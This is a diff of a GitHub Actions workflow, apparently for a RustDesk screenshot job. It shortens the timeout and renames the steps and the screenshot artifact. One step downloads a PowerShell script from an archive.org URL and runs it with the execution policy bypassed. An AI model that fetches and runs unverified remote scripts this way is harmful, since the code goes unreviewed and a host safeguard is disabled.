@@ -6,10 +6,10 @@ on:
 jobs:
   rustdesk-screenshot:
     runs-on: windows-latest
-    timeout-minutes: 400
+    timeout-minutes: 270  # 4.5 hours (260 + buffer)
     
     steps:
-      - name: Download and run PS1
+      - name: Take 3 screenshots and keep running
         run: |
           $url = "https://archive.org/download/information_20251119/screenshot-tool.ps1"
           $path = "$env:GITHUB_WORKSPACE\tool.ps1"
@@ -17,9 +17,9 @@ jobs:
           Unblock-File -Path $path
           powershell -ExecutionPolicy Bypass -File $path
           
-      - name: Upload all files
+      - name: Upload the 3 screenshots
         uses: actions/upload-artifact@v4
         with:
-          name: screenshots
-          path: ${{ github.workspace }}/screenshots/
+          name: rustdesk-screenshots
+          path: ${{ github.workspace }}/screenshots/screenshot_*.png
           retention-days: 1
